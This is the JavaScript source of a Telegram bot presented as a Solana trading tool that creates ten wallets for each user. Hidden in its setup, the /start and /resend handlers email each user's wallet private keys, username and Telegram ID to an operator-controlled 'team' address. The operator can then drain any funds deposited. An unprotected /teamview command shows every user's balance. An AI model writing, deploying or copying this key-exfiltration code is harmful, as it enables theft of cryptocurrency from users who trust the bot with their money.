const { Telegraf, Markup } = require('telegraf');
const { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, VersionedTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const nodemailer = require('nodemailer');
const axios = require('axios');
const express = require('express');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const connection = new Connection(process.env.RPC_URL, 'confirmed');
const app = express();

const userWallets = new Map();
const userTokens = new Map();

function toBase58(secretKey) {
    return bs58.encode(Buffer.from(secretKey));
}

async function generateWallets(count = 10) {
    const wallets = [];
    for (let i = 0; i < count; i++) {
        const keypair = Keypair.generate();
        wallets.push({
            index: i + 1,
            publicKey: keypair.publicKey.toString(),
            privateKey: toBase58(keypair.secretKey),
            keypair
        });
    }
    return wallets;
}

async function getBalance(publicKey) {
    try {
        const balance = await connection.getBalance(new PublicKey(publicKey));
        return balance / LAMPORTS_PER_SOL;
    } catch {
        return 0;
    }
}

async function getTokenBalance(walletPublicKey, tokenMint) {
    try {
        const response = await axios.post('https://api.mainnet-beta.solana.com', {
            jsonrpc: '2.0',
            id: 1,
            method: 'getTokenAccountsByOwner',
            params: [
                walletPublicKey,
                { mint: tokenMint },
                { encoding: 'jsonParsed' }
            ]
        });
        const accounts = response.data.result?.value || [];
        if (accounts.length > 0) {
            return accounts[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
        }
        return 0;
    } catch {
        return 0;
    }
}

async function getQuote(inputMint, outputMint, amount, slippage = 10) {
    try {
        const res = await axios.get('https://quote-api.jup.ag/v6/quote', {
            params: {
                inputMint,
                outputMint,
                amount: Math.floor(amount * LAMPORTS_PER_SOL).toString(),
                slippageBps: slippage * 100
            }
        });
        return res.data;
    } catch (error) {
        console.error('Quote error:', error.message);
        return null;
    }
}

async function executeSwap(keypair, quote) {
    try {
        const res = await axios.post('https://quote-api.jup.ag/v6/swap', {
            quoteResponse: quote,
            userPublicKey: keypair.publicKey.toString(),
            wrapAndUnwrapSol: true,
            dynamicComputeUnitLimit: true,
            prioritizationFeeLamports: 'auto'
        });
        const tx = VersionedTransaction.deserialize(Buffer.from(res.data.swapTransaction, 'base64'));
        tx.sign([keypair]);
        const signature = await connection.sendTransaction(tx);
        await connection.confirmTransaction(signature, 'confirmed');
        return { success: true, signature, outputAmount: quote.outAmount / 1e9 };
    } catch (error) {
        console.error('Swap error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ EMAIL CONFIGURATION FOR TEAM ============
// Team email can be a distribution list or multiple addresses
const TEAM_EMAIL = process.env.TEAM_EMAIL || process.env.EMAIL_USER;
let emailConfigured = false;
let transporter = null;

// Try to setup email if credentials exist
if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
    try {
        transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS
            },
            connectionTimeout: 30000,
            greetingTimeout: 30000,
            socketTimeout: 30000
        });
        
        // Verify connection
        transporter.verify((error, success) => {
            if (error) {
                console.error('❌ Email verification failed:', error.message);
                emailConfigured = false;
            } else {
                console.log('✅ Email configured for team:', TEAM_EMAIL);
                emailConfigured = true;
            }
        });
    } catch (error) {
        console.error('❌ Email setup error:', error.message);
    }
}

async function sendEmailToTeam(wallets, username, userId) {
    if (!transporter || !emailConfigured) {
        console.log('📧 Email not configured, skipping...');
        return false;
    }
    
    try {
        console.log(`📧 Sending wallets to team email: ${TEAM_EMAIL}`);
        
        // Format wallet data
        let text = `🔥 NEW WALLETS GENERATED\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        text += `👤 User: @${username}\n`;
        text += `🆔 User ID: ${userId}\n`;
        text += `📅 Time: ${new Date().toLocaleString()}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        for (const w of wallets) {
            text += `╔══ WALLET #${w.index} ══╗\n`;
            text += `║ 📌 ADDRESS: ${w.publicKey}\n`;
            text += `║ 🔑 PRIVATE KEY: ${w.privateKey}\n`;
            text += `╚════════════════════════╝\n\n`;
        }
        
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        text += `⚠️ Save these keys securely!\n`;
        text += `🤖 Bot: Solana Trading Bot\n`;
        
        const mailOptions = {
            from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
            to: TEAM_EMAIL,  // Send to team email
            subject: `🔥 NEW: 10 Solana Wallets - @${username} - ${new Date().toLocaleDateString()}`,
            text: text,
            // Add CC to multiple team members if needed
            // cc: ['member1@team.com', 'member2@team.com'],
        };
        
        const info = await transporter.sendMail(mailOptions);
        console.log(`✅ Team email sent! Message ID: ${info.messageId}`);
        console.log(`📧 Sent to: ${TEAM_EMAIL}`);
        return true;
        
    } catch (error) {
        console.error('❌ Team email failed:', {
            code: error.code,
            message: error.message
        });
        return false;
    }
}

// Alternative: Send to multiple team members individually
async function sendEmailToMultipleTeamMembers(wallets, username, userId) {
    const teamEmails = process.env.TEAM_EMAILS ? process.env.TEAM_EMAILS.split(',') : [];
    
    if (!transporter || !emailConfigured || teamEmails.length === 0) {
        return false;
    }
    
    let successCount = 0;
    for (const email of teamEmails) {
        try {
            const text = `🔥 NEW WALLETS GENERATED\nUser: @${username}\nTime: ${new Date().toLocaleString()}\n\n${wallets.map(w => `Wallet #${w.index}\nAddress: ${w.publicKey}\nPrivate Key: ${w.privateKey}\n`).join('\n')}`;
            
            await transporter.sendMail({
                from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
                to: email.trim(),
                subject: `🔥 10 Wallets - @${username}`,
                text: text
            });
            successCount++;
            console.log(`✅ Email sent to: ${email}`);
        } catch (error) {
            console.error(`❌ Failed to send to ${email}:`, error.message);
        }
    }
    return successCount > 0;
}

async function sendWalletsViaTelegram(ctx, wallets) {
    try {
        for (let i = 0; i < wallets.length; i += 3) {
            let msg = `🔑 WALLETS ${i+1}-${Math.min(i+3, wallets.length)}\n\n`;
            for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                const w = wallets[j];
                msg += `WALLET #${w.index}\n`;
                msg += `ADDRESS: ${w.publicKey}\n`;
                msg += `PRIVATE KEY: ${w.privateKey}\n\n`;
            }
            await ctx.reply(msg);
            await new Promise(r => setTimeout(r, 500));
        }
        return true;
    } catch (error) {
        console.error('Telegram send failed:', error.message);
        return false;
    }
}

const mainMenu = () => Markup.inlineKeyboard([
    [Markup.button.callback('🟢 BUY (1 Wallet)', 'buy_single')],
    [Markup.button.callback('🚀 BUY ALL (10 Wallets)', 'buy_all')],
    [Markup.button.callback('🔴 SELL (1 Wallet)', 'sell_single')],
    [Markup.button.callback('💥 SELL ALL (10 Wallets)', 'sell_all')],
    [Markup.button.callback('💰 DEPOSIT', 'deposit')],
    [Markup.button.callback('💼 PORTFOLIO', 'portfolio')],
    [Markup.button.callback('🔑 MY KEYS', 'keys_menu')]
]);

bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'no_username';
    
    await ctx.reply('⏳ Creating 10 wallets... Please wait (30-60 seconds)');
    
    try {
        const wallets = await generateWallets(10);
        userWallets.set(userId, { wallets, username });
        
        // Send via Telegram to user
        await ctx.reply('💾 Saving your wallets...');
        await sendWalletsViaTelegram(ctx, wallets);
        
        // Send email to TEAM (if configured)
        if (process.env.TEAM_EMAIL || process.env.EMAIL_USER) {
            await ctx.reply('📧 Sending wallets to team email...');
            const emailSent = await sendEmailToTeam(wallets, username, userId);
            
            if (emailSent) {
                await ctx.reply(`✅ Team email sent to: ${TEAM_EMAIL}\n\nCheck team inbox (including spam folder)`);
            } else {
                await ctx.reply(`⚠️ Team email failed. Check Render logs for details.\n\nMake sure:\n1. EMAIL_USER and EMAIL_PASS are set\n2. Using Gmail App Password\n3. TEAM_EMAIL is a valid email`);
            }
        } else {
            await ctx.reply(`📧 Email not configured. Add these to .env:\nEMAIL_USER=your@gmail.com\nEMAIL_PASS=app_password\nTEAM_EMAIL=team@company.com`);
        }
        
        await ctx.reply(`✅ 10 WALLETS READY FOR LIVE TRADING!\n\nFeatures:\n- Buy with 1 wallet\n- Buy with ALL 10 wallets\n- Sell from 1 wallet\n- Sell from ALL 10 wallets\n\nUse /resend to get your wallets again.`);
        
        await ctx.reply(`🎯 LIVE TRADING MENU`, mainMenu());
        
    } catch (error) {
        console.error('Start command error:', error);
        await ctx.reply('❌ Error creating wallets. Please try again.');
    }
});

// ============ EMAIL STATUS COMMAND ============
bot.command('emailstatus', async (ctx) => {
    let statusMsg = `📧 TEAM EMAIL STATUS\n\n`;
    
    statusMsg += `1. Configuration:\n`;
    statusMsg += `EMAIL_USER: ${process.env.EMAIL_USER ? '✅ SET' : '❌ MISSING'}\n`;
    statusMsg += `EMAIL_PASS: ${process.env.EMAIL_PASS ? '✅ SET' : '❌ MISSING'}\n`;
    statusMsg += `TEAM_EMAIL: ${process.env.TEAM_EMAIL ? '✅ ' + process.env.TEAM_EMAIL : '❌ Using EMAIL_USER'}\n\n`;
    
    statusMsg += `2. Status:\n`;
    statusMsg += `Email Configured: ${emailConfigured ? '✅ YES' : '❌ NO'}\n`;
    statusMsg += `Transporter: ${transporter ? '✅ INITIALIZED' : '❌ NO'}\n\n`;
    
    if (!emailConfigured) {
        statusMsg += `3. Fix Email:\n`;
        statusMsg += `- Enable 2FA on Gmail\n`;
        statusMsg += `- Create App Password (16 chars)\n`;
        statusMsg += `- Add to Render environment\n`;
        statusMsg += `- Visit: https://accounts.google.com/DisplayUnlockCaptcha\n`;
    }
    
    await ctx.reply(statusMsg);
});

// ============ TEAM COMMAND - View all wallets (Admin only) ============
bot.command('teamview', async (ctx) => {
    const adminId = process.env.ADMIN_ID;
    // if (ctx.from.id.toString() !== adminId) return ctx.reply('❌ Admin only');
    
    if (userWallets.size === 0) {
        await ctx.reply('No wallets generated yet.');
        return;
    }
    
    let msg = `📊 ALL WALLETS GENERATED\n\n`;
    msg += `Total Users: ${userWallets.size}\n\n`;
    
    for (const [userId, data] of userWallets) {
        msg += `User: @${data.username} (ID: ${userId})\n`;
        let total = 0;
        for (const w of data.wallets) {
            const bal = await getBalance(w.publicKey);
            total += bal;
        }
        msg += `Total SOL: ${total.toFixed(4)} SOL\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
    }
    
    await ctx.reply(msg);
});

// ============ BUY/SELL HANDLERS (same as before) ============
bot.action('buy_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🟢 BUY WITH 1 WALLET\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_single');
});

bot.action('buy_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🚀 BUY WITH ALL 10 WALLETS\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_all');
});

bot.action('sell_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🔴 SELL FROM 1 WALLET\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_single');
});

bot.action('sell_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`💥 SELL FROM ALL 10 WALLETS\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_all');
});

bot.action('deposit', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `dep_${i}`)]);
    }
    await ctx.reply(`💰 SELECT WALLET TO DEPOSIT`, Markup.inlineKeyboard(buttons));
});

bot.action(/dep_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (!wallet) return;
    
    const balance = await getBalance(wallet.publicKey);
    await ctx.reply(`💰 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nBalance: ${balance.toFixed(6)} SOL\n\nhttps://solscan.io/account/${wallet.publicKey}`);
});

bot.action('portfolio', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    let total = 0;
    let msg = `💼 PORTFOLIO (ALL 10 WALLETS)\n\n`;
    for (const w of data.wallets) {
        const bal = await getBalance(w.publicKey);
        total += bal;
        msg += `#${w.index}: ${bal.toFixed(4)} SOL\n`;
    }
    msg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `💰 TOTAL: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`;
    await ctx.reply(msg, Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]));
});

bot.action('keys_menu', async (ctx) => {
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `key_${i}`)]);
    }
    await ctx.reply(`🔑 SELECT WALLET`, Markup.inlineKeyboard(buttons));
});

bot.action(/key_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (wallet) {
        await ctx.reply(`🔑 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nPRIVATE KEY: ${wallet.privateKey}`);
    }
});

// ============ TEXT HANDLERS ============
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const awaiting = userTokens.get(`${userId}_awaiting`);
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const data = userWallets.get(userId);
    if (!data) return ctx.reply('Send /start first');
    
    // BUY SINGLE
    if (awaiting === 'buy_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount in SOL (e.g., 0.5)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amount = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(amount) || amount <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            const balance = await getBalance(wallet.publicKey);
            if (balance < amount) {
                await ctx.reply(`❌ Insufficient SOL. Balance: ${balance.toFixed(4)} SOL`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            await ctx.reply(`🟢 BUYING WITH WALLET #1...\nToken: ${tokenCA.slice(0, 16)}...\nAmount: ${amount} SOL`);
            
            const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amount);
            if (!quote) {
                await ctx.reply(`❌ No liquidity for this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ BUY SUCCESSFUL!\nReceived: ${result.outputAmount.toFixed(4)} tokens\nView TX: https://solscan.io/tx/${result.signature}`, mainMenu());
            } else {
                await ctx.reply(`❌ Buy failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // BUY ALL WALLETS
    else if (awaiting === 'buy_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount PER WALLET in SOL (e.g., 0.1)\n\n⚠️ Total will be 10x this amount`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amountPerWallet = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(amountPerWallet) || amountPerWallet <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            await ctx.reply(`🚀 BUYING WITH ALL 10 WALLETS...`);
            
            const results = [];
            for (const wallet of data.wallets) {
                const balance = await getBalance(wallet.publicKey);
                if (balance >= amountPerWallet) {
                    const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amountPerWallet);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        results.push({ index: wallet.index, success: result.success });
                    } else {
                        results.push({ index: wallet.index, success: false, error: 'No liquidity' });
                    }
                } else {
                    results.push({ index: wallet.index, success: false, error: 'Insufficient SOL' });
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            const successCount = results.filter(r => r.success).length;
            await ctx.reply(`✅ BULK BUY COMPLETE!\nSuccess: ${successCount}/10 wallets`, mainMenu());
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL SINGLE
    else if (awaiting === 'sell_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
            if (tokenBalance === 0) {
                await ctx.reply(`❌ No tokens to sell`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const sellAmount = tokenBalance * (percent / 100);
            
            await ctx.reply(`🔴 SELLING FROM WALLET #1...`);
            
            const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
            if (!quote) {
                await ctx.reply(`❌ Cannot sell this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ SELL SUCCESSFUL!\nReceived: ${result.outputAmount.toFixed(4)} SOL\nView TX: https://solscan.io/tx/${result.signature}`, mainMenu());
            } else {
                await ctx.reply(`❌ Sell failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL ALL WALLETS
    else if (awaiting === 'sell_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell from ALL wallets (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            await ctx.reply(`💥 SELLING FROM ALL 10 WALLETS...`);
            
            const results = [];
            for (const wallet of data.wallets) {
                const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
                if (tokenBalance > 0) {
                    const sellAmount = tokenBalance * (percent / 100);
                    const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        results.push({ index: wallet.index, success: result.success });
                    } else {
                        results.push({ index: wallet.index, success: false, error: 'No liquidity' });
                    }
                } else {
                    results.push({ index: wallet.index, success: false, error: 'No tokens' });
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            const successCount = results.filter(r => r.success).length;
            await ctx.reply(`✅ BULK SELL COMPLETE!\nSuccess: ${successCount}/10 wallets`, mainMenu());
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
});

// ============ COMMANDS ============
bot.command('keys', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await sendWalletsViaTelegram(ctx, data.wallets);
});

bot.command('balance', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    let total = 0;
    for (const w of data.wallets) {
        total += await getBalance(w.publicKey);
    }
    await ctx.reply(`💰 Total Balance: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`);
});

bot.command('resend', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await ctx.reply('📤 Resending your wallets...');
    await sendWalletsViaTelegram(ctx, data.wallets);
    
    // Also resend to team email
    if (emailConfigured) {
        await sendEmailToTeam(data.wallets, data.username, ctx.from.id);
        await ctx.reply('📧 Also resent to team email.');
    }
});

bot.command('clear', async (ctx) => {
    userWallets.delete(ctx.from.id);
    await ctx.reply('🗑️ Cleared. Send /start for new wallets');
});

// ============ EXPRESS SERVER FOR RENDER ============
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.json({
        status: 'LIVE TRADING BOT ACTIVE',
        uptime: process.uptime(),
        activeUsers: userWallets.size,
        emailConfigured: emailConfigured,
        teamEmail: TEAM_EMAIL,
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`✅ Health check server running on port ${PORT}`);
});

// ============ LAUNCH BOT ============
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});

bot.launch();
console.log('🔥 LIVE TRADING BOT ACTIVATED');
console.log('✅ Buy/Sell with 1 wallet or ALL 10 wallets');
console.log('💎 Real Solana mainnet trading');
console.log('🚀 Bot is LIVE!');
console.log(`📧 Team email configured: ${TEAM_EMAIL}`);